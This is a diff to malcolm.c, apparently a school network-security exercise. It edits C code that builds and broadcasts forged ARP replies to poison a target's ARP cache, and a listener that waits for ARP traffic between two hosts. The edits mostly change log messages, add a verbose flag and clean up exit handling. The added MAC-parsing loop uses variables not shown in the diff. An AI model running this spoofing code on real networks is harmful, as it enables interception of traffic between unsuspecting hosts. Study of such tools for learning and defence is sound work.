@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   malcolm.c                                          :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: nicolas <nicolas@student.42.fr>            +#+  +:+       +#+        */
+/*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
-/*   Updated: 2025/11/20 16:53:50 by nicolas          ###   ########.fr       */
+/*   Updated: 2025/11/24 12:47:38 by nponchon         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -57,12 +57,11 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	unsigned char src_mac[6];
 	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);
+	for (size_t i = 0; i < ft_strlen(mac); i += 3)
+		dest[i / 3] = hex2int(&mac[i]);
 
 	// broadcast ARP to force a cache update on the target (unicast does not work well)
 	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-	//sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-	//	&broadcast_mac[0], &broadcast_mac[1], &broadcast_mac[2],
-	//	&broadcast_mac[3], &broadcast_mac[4], &broadcast_mac[5]);
 
 	struct ether_header eth;
 	ft_memcpy(eth.ether_shost, src_mac, 6);
@@ -77,7 +76,6 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
 	ft_memcpy(arp.arp_sha, src_mac, 6);
 	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
-	// For gratuitous ARP: target is same as source (self-announcement)
 	ft_memcpy(arp.arp_tha, src_mac, 6);
 	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);
 
@@ -90,13 +88,11 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	sll.sll_halen = 6;
 	ft_memcpy(sll.sll_addr, broadcast_mac, 6);
 
-	printf("Poisoning ARP: '%s is at %s'\n", m->source_ip, m->source_mac);
-
 	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
 	if (bytes_sent < 0) {
 		fprintf(stderr, "Error: sendto failed\n");
 	} else {
-		printf("[POISON] Successfully sent (%zd bytes)\n", bytes_sent);
+		printf("Successfully sent fake ARP reply\n");
 	}
 }
 
@@ -123,7 +119,7 @@ int	listen_arp(t_malcolm *m)
     struct sockaddr_ll addr;
     socklen_t addrlen = sizeof(addr);
 
-    printf("Starting to listen for packets between A and B...\n");
+    printf("Listening for packets between A and B...\n");
 
     while (g_sigint == 0) {
         ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
@@ -136,8 +132,11 @@ int	listen_arp(t_malcolm *m)
 			break;
     }
 
-	print_arp(buf);
-	//sleep(1);
+	if (g_sigint) // exit gracefully on Ctrl+C
+		return (free_malcolm(m), 0);
+
+	if (m->verbose)
+		print_arp(buf);
 	send_arp(m, buf);
 
     return (0);
